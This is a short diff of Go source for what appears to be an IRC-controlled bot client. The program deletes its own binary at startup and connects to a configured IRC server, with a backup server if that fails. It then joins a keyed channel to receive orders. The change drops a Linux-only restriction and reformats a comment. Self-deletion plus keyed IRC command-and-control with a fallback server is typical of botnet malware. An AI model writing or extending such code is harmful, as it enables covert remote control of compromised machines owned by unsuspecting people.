@@ -46,7 +46,9 @@ func run(server string) error {
 			}
 		}()
 
-		//Check is user modes and join IRC channel
+		/*
+			Check is user modes and join IRC channel
+		*/
 		if lib.Find(ircRead, "+i") || lib.Find(ircRead, "+w") || lib.Find(ircRead, "+x") {
 			b.Send(fmt.Sprint("JOIN " + IRC_CHANNEL + IRC_CHANNEL_KEY))
 		}
@@ -65,9 +67,6 @@ func run(server string) error {
 
 func main() {
 	os.Remove(os.Args[0])
-	if runtime.GOOS != "linux" {
-		lib.Kill()
-	}
 	if run(IRC_SERVER) != nil {
 		if IRC_BACKUP_SERVER == "" {
 			lib.Kill()
